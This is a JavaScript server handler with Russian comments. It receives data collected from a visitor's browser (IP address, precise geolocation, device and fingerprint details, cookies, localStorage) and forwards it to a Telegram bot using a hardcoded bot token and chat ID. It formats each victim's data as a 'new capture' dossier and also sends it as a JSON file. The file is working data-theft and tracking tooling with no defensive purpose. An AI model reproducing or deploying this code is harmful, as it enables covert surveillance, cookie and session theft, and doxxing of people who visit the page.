export default async function handler(req, res) {
    if (req.method !== "POST") return res.status(405).end();

    const data = req.body;
    const BOT_TOKEN = "8766394398:AAHuiigCpIiMoDhh2pz5YsNcmpEQTCvJtxc";
    const CHAT_ID = "8510274209";

    // -------- Красивое текстовое досье ----------
    const ip = data.ip || "неизвестен";
    const geo = data.geo
        ? `${data.geo.lat.toFixed(4)}, ${data.geo.lon.toFixed(4)} (точность ${data.geo.accuracy}м)`
        : "не определена";
    const device = `${data.platform || "?"}, ${data.screen || "?"}, ${data.orientation || ""}`;
    const fingerprint = [
        data.canvas ? `Canvas: ${data.canvas.substring(0, 30)}…` : "",
        data.webgl ? `WebGL: ${data.webgl}` : "",
        data.audio ? `Audio: ${data.audio}` : ""
    ].filter(Boolean).join(" | ");
    const battery = data.battery || "неизвестно";
    const network = data.network || "неизвестно";
    const memory = data.deviceMemory ? `${data.deviceMemory} ГБ` : "неизвестно";
    const cores = data.hardwareConcurrency || "?";

    const text = [
        `💀 **НОВЫЙ ЗАХВАТ**`,
        ``,
        `📍 **IP:** \`${ip}\``,
        `🌍 **Гео:** ${geo}`,
        `📱 **Устройство:** ${device}`,
        `🔋 **Батарея:** ${battery}`,
        `📶 **Сеть:** ${network}`,
        `🧠 **CPU:** ${cores} ядер | RAM: ${memory}`,
        `🍪 **Cookies:** ${data.cookies || "нет"}`,
        `📦 **LocalStorage:** ${data.localStorage ? data.localStorage.length : 0} символов`,
        `🕵️ **Фингерпринт:** ${fingerprint || "не собран"}`,
        `🕒 **Время:** ${data.timestamp || "?"}`
    ].join("\n");

    try {
        // 1. Отправляем красивое текстовое досье
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: "Markdown",
                disable_web_page_preview: true
            })
        });

        // 2. Отправляем полный JSON как файл
        const jsonStr = JSON.stringify(data, null, 2);
        const blob = new Blob([jsonStr], { type: "application/json" });
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("document", blob, `dossier_${ip}.json`);
        form.append("caption", `📁 Полное досье (${ip})`);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: "POST",
            body: form
        });

    } catch (error) {
        // Если что-то пошло не так – шлём JSON прямо в чат
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
                parse_mode: "Markdown"
            })
        });
    }

    res.status(200).json({ status: "ok" });
}
